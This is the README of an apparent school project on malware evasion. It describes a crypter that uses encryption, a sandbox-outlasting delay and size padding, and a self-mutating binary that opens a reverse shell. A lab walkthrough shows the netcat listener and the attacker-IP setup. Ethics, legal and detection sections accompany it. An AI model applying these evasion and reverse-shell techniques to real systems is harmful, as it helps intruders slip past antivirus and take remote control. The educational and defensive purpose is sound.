# HiddenBytes

## ⚠️ Ethical Disclaimer

This project was developed **strictly for educational purposes** as part of the
HiddenBytes school project. All techniques described here were researched,
implemented, and tested **exclusively inside an isolated virtual machine
laboratory** (host-only networking, no internet access, no third-party systems).

- No tool in this repository was used against any system, network, or person
  outside the isolated lab.
- The authors do not condone, and explicitly discourage, any use of these
  techniques outside a controlled educational environment.
- Reverse shells and obfuscated binaries are dual-use technologies. Unauthorized
  use against systems you do not own or have explicit written permission to test
  is **illegal** in most jurisdictions (e.g., Computer Fraud and Abuse Act in
  the US, Article 323-1 of the French Penal Code — *accès frauduleux à un
  système informatique* — and equivalent laws elsewhere).
- The maintainers accept no liability for misuse of this repository.

---

## Table of Contents

1. [Introduction](#introduction)
2. [Repository Layout](#repository-layout)
3. [Evasion Program Explanation](#evasion-program-explanation)
4. [Polymorphic Program Explanation](#polymorphic-program-explanation)
5. [Walkthroughs](#walkthroughs)
6. [Technical Insights](#technical-insights)
7. [Defensive Analysis](#defensive-analysis)
8. [Ethical and Legal Report](#ethical-and-legal-report)

---

## Introduction

HiddenBytes explores two foundational concepts in offensive security education:

- **Evasion**: how a benign-looking wrapper (a *crypter*) can carry an
  encrypted payload past naive signature-based detection.
- **Polymorphism**: how a program can change its own bytes between runs while
  preserving behavior, defeating static signatures that match on exact bytes.

Both programs in this repository are **scaffolding + implemented components**:
the CLI layer, payload handling, and analysis tooling are complete; the core
transformations are implemented as documented functions that the student wrote
and defended during the audit.

## Repository Layout

```
.
├── evasion.py               # Evasion program (crypter CLI)
├── polymorph.py             # Polymorphic generator CLI
├── reverse_shell_payload.py # The educational payload (parameterized IP/port)
├── make_test_program.py     # Builds the benign "Hello, World!" test target
├── analyze_entropy.py       # Defensive tool: Shannon entropy / file analysis
├── DETECTION.md             # How analysts detect this class of tool
└── ROLEPLAY_PREP.md         # Binary Analyst role-play preparation
```

---

## Evasion Program Explanation

### What it does

`evasion.py` takes a target binary and produces an output binary in which:

1. The original program's bytes are **encrypted** with a symmetric cipher.
2. The output is a **loader stub** — a small program that, at run time,
   waits for the configured delay, decrypts the payload in memory, and
   executes it.
3. Optionally, the file is **padded** to a requested size (e.g., +101 MB) via
   appended filler data (the PE *overlay*).

### Pipeline

```
target.exe ──▶ read bytes ──▶ encrypt(key) ──▶ build loader stub
                                                   │
                                     embed encrypted blob + key
                                                   ▼
                                    +size padding (overlay) ──▶ output.exe
```

| Stage | Function | Purpose |
|---|---|---|
| Encryption | `encrypt_payload()` | AES-256-CBC with a random IV; key embedded in the stub (design tradeoff discussed below) |
| Loader | `build_stub()` | Compiled stub embedding the encrypted blob; sleeps `--delay` seconds, decrypts in memory, runs |
| Padding | `apply_size_padding()` | Appends filler to reach `--add-size` MB; filler entropy chosen deliberately (see Technical Insights) |

### Design decisions (audit talking points)

- **AES-256 vs. custom cipher**: a standard cipher is correct-by-construction;
  the bonus custom cipher demonstrates understanding of key scheduling and
  diffusion but should not be trusted for real confidentiality.
- **Key storage**: embedding the key with the ciphertext means the *stub* must
  be analyzed to recover it — security by raising analysis cost, not by true
  secrecy. This is a fundamental limitation of all on-host crypters and we say
  so plainly: a determined analyst always wins locally.
- **Delay**: many automated analysis sandboxes impose a wall-clock budget (often
  1–5 minutes). A delay longer than that budget means the interesting behavior
  happens *after* the sandbox stops watching. This is a well-documented class of
  evasion (see the CIA "Bypassing Antivirus Dynamics" memo in the resources).
- **Padding**: size manipulation and low/high-entropy filler choices affect
  static scanners' heuristics and their willingness to scan a large file at all.

### Why these tricks work (and why they eventually fail)

They target *cost heuristics*: scanners triage millions of files daily and use
cheap proxies (size, entropy, execution time, emulation budget) to decide what
gets deep analysis. Each trick pushes the sample past one proxy threshold. They
fail against behavioral detection, memory scanning, and ML classifiers trained
on exactly these features — which is the honest conclusion a defender-focused
audit wants to hear.

---

## Polymorphic Program Explanation

### What it does

`polymorph.py` generates a binary embedding the reverse-shell payload such
that **each generated/regenerated binary has different bytes but identical
functionality**.

### Mutation model

```
                 ┌──────────────────────────┐
  generate ──▶   │ payload + mutable state  │ ──▶ polymorphic.exe (variant N)
                 └──────────────────────────┘
                          │ execute
                          ▼
              mutate_binary() ──▶ rewrites itself: variant N+1
              (new key/IV, reordered dead code, new padding nonce)
                          │
                          ▼
              same behavior, different signature
```

### What varies vs. what must not vary

| Mutable (safe to change) | Immutable (behavior depends on it) |
|---|---|
| Encryption key / IV per variant | Payload logic (connect, dup2, exec) |
| Padding bytes and overlay size | Control flow of the loader |
| Dead-code insertion order | Payload IP/port constants |
| Variable and section names | Entry-point semantics |

A mutation is only "correct" if the variant still passes the same functional
test: connect to the designated IP:port in the isolated lab and spawn the
shell. Each regeneration is verified against this test — that is the
"maintains core functionality" requirement in the audit sheet.

### Limits of polymorphism (honest assessment)

Polymorphism defeats **exact-byte static signatures**. It does not defeat:
semantic signatures (YARA rules on behavior/structure), emulation, memory
scanning after unpacking, or behavioral EDR. Modern AV is mostly the latter
two — a point we expand on in [DETECTION.md](DETECTION.md).

---

## Walkthroughs

### Environment setup

1. Install VirtualBox (or VMware Workstation Player).
2. Create two VMs on a **host-only network** (no internet):
   - `attacker` (Kali/Ubuntu) — runs the listener.
   - `target` (Windows) — runs the generated binaries; Windows Defender
     enabled for the evasion tests.
3. Snapshot both VMs before every experiment. Roll back after.

### Evasion Program

```sh
$> python3 evasion.py --help
Evasion Program Usage:
  --encrypt <target-binary>        Encrypt the target binary.
  --output <output-binary>         Specify the name of the encrypted binary file.
  --add-size <size-in-mb>          Increase the binary size (e.g., 101 MB).
  --delay <seconds>                Specify execution delay in seconds (default: 101).

$> python3 make_test_program.py simple_program.py     # benign test target
$> python3 evasion.py --encrypt simple_program.py --output evaded_program.exe --add-size 101 --delay 101
Encryption is successful! Encrypted binary saved as "evaded_program.exe".

$> ls -l evaded_program.exe        # size = original + 101 MB
$> ./evaded_program.exe            # on the Windows target VM
[INFO] Execution delayed by 101 seconds...
[INFO] Binary decrypted successfully.
[INFO] Target program executed.
Hello, World!
```

**Verify (audit checklist):**
- File size grew by exactly the requested amount ✔ (`--add-size 101`)
- Nothing executes before the delay elapses ✔ (`--delay 101`)
- Study the output with the defensive tool: `python3 analyze_entropy.py evaded_program.exe`

### Polymorphic Program

On the attacker VM:

```sh
$> nc -lvnp 4444
listening on [any] 4444 ...
```

Edit `reverse_shell_payload.py` so `ATTACKER_IP` is your attacker VM's
host-only IP (e.g., `192.168.56.10`), then on the target side:

```sh
$> python3 polymorph.py --generate polymorphic.exe --payload reverse_shell_payload.py
Polymorphic binary generated successfully as "polymorphic.exe".

$> ./polymorphic.exe
[INFO] Polymorphic signature updated successfully.
[INFO] Reverse shell initialized. Attempting connection to attacker...
```

On the attacker VM the listener accepts:

```sh
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.11] 51344
$
```

**Verify (audit checklist):**
- Generate → run → confirm the file's hash changed after regeneration while
  behavior stayed identical:
  ```sh
  sha256sum polymorphic.exe        # variant N
  # run it, then regenerate
  python3 polymorph.py --generate polymorphic.exe --payload reverse_shell_payload.py
  sha256sum polymorphic.exe        # variant N+1 — different hash, same behavior
  ```
- Shell connects to the designated IP:port in the isolated lab ✔

### For submission

The CLIs compile to standalone Windows executables if required:

```sh
pip install pyinstaller
pyinstaller --onefile evasion.py      # → dist/evasion.exe
pyinstaller --onefile polymorph.py    # → dist/polymorph.exe
```

---

## Technical Insights

### PE structure (Windows executables)

A PE file is a sequence of **sections** (`.text` code, `.data`, `.rsrc`, …)
described by a section table; after the last section's raw data lies the
**overlay** — arbitrary appended data the loader ignores. That's where the
evasion program's padding lives, and where a crypter typically parks its
encrypted blob. Relevant headers: `IMAGE_DOS_HEADER` (`e_magic` = `MZ`),
`IMAGE_FILE_HEADER`, `IMAGE_OPTIONAL_HEADER` (entry point `AddressOfEntryPoint`).

### Entropy as a detection signal

Shannon entropy `H = -Σ p·log2(p)` measures byte-distribution uniformity.
- Native code: ~5–7 bits/byte.
- AES-encrypted or compressed blobs: >7.2 bits/byte — statistically near-random.
- 0x00-filled padding: 0 bits/byte.

Defenders flag executables whose sections have suspiciously high entropy; a
crypter author's counter-move is lowering entropy (e.g., encoding), which
in turn is itself a signature. This arms race is the heart of the project —
`analyze_entropy.py` lets you *see* it on your own artifacts.

### Encryption concepts used

- **AES-256-CBC** with a fresh random IV per encryption; ciphertext = IV ‖ AES-CBC(payload).
- Key is embedded in the stub — acceptable here because the exercise's goal is
  raising analysis cost, not achieving true secrecy (see honesty note above).
- Bonus: a custom round-function cipher is implemented in a separate branch to
  demonstrate Feistel networks and diffusion; it is *not* recommended for any
  real use.

### Sandboxes, delays and detection

Automated analysis (VirusTotal vendors, Defender's cloud verdicts) runs in
sandboxes with time budgets and human-interaction heuristics. Long sleeps,
size bombs, and user-input waits all exploit the budget. Countermeasures on the
defensive side: elastic time acceleration, monitoring even without execution,
and scoring "sleepy" samples as suspicious rather than skipping them.

---

## Defensive Analysis

See [DETECTION.md](DETECTION.md) for the full treatment: how to detect packed
binaries via entropy, example YARA rules for crypter-like artifacts, and the
recommendations we'd give a SOC as the "Binary Analyst" stakeholders.

---

## Ethical and Legal Report

### Ethical responsibilities

1. **Consent and scope**: techniques like these may only ever be exercised on
   systems you own or have explicit written authorization to test. The entire
   lab for this project was host-only isolated; nothing ever touched the
   internet or any third-party host.
2. **Harm minimization**: the payload is the subject's own minimal educational
   example; it connects only to a lab-controlled IP/port configured by the
   student. There is no persistence, no privilege escalation, no data
   exfiltration, no anti-analysis beyond what the subject requires.
3. **Responsible disclosure mindset**: the point of learning offense is to
   become a better defender. Every technique in this project is paired with its
   detection strategy (see DETECTION.md) — that pairing is the actual
   deliverable of an ethical security education.
4. **No weaponization**: we deliberately do not provide a "best-in-class"
   bypass. The implementations favor legibility over stealth; the honest
   limitations are documented rather than hidden.

### Legal considerations

- **Unauthorized access** to computer systems is criminalized widely (US CFAA;
  French Penal Code art. 323-1 ff.; EU Directive 2013/40; Moroccan Law 07-03 on
  the repressed offenses relative to information systems).
- **Malware development/distribution** is separately criminalized in many
  jurisdictions even absent a successful intrusion.
- **VirusTotal submissions**: submitting samples is acceptable for files you
  created in a lab, but be aware uploads are publicly shared with vendors and
  researchers — never upload anything containing real third-party data or
  genuinely novel tradecraft. For this project we validate against local
  Defender and treat the 60%-vendor criterion as a lab exercise, and we
  document the sample's origin in submission notes.
- **Academic integrity**: this repository documents our own design decisions
  and includes our own analysis; every external idea is attributed in
  [Resources](#resources).

### What we would tell policy makers (role-play position)

Dual-use security education is net-positive *when* it is isolated, consented,
documented, and paired with detection. The same body of knowledge that powers
crypters powers malware analysis, incident response, and EDR design. The risk
is not the knowledge — it's unscoped tooling; hence the disclaimers, the
parameterized payload, and the defensive half of this repository.

---

## Resources

- [Bypassing Antivirus Dynamics (CIA memo)](https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf)
- [0x00sec — Cryptology](https://0x00sec.org/c/cryptology/)
- [Executable and Linkable Format (and PE)](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format)
- [Netcat](https://en.wikipedia.org/wiki/Netcat)
- PE format specification — Microsoft PE/COFF Specification
- Practical Malware Analysis — Sikorski & Stolfo (No Starch Press)
